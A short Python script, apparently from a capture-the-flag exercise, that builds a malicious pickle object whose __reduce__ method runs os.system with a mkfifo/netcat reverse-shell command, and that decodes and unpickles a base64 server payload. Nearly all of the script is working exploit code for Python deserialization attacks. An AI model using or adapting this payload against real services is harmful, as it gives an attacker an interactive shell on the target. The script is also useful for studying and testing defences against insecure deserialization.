#!/usr/bin/env python3

import pickle
import base64
import pickletools
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

def anti_pickle_serum():
    pass

raw = "KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu"
data = base64.urlsafe_b64decode(raw)

unpickled = pickle.loads(data)


exit()
print("== Server pickled object")
pt = pickletools.dis(data)

print("== Example pickled")
p = pickle.dumps(RCE())
pt = pickletools.dis(p)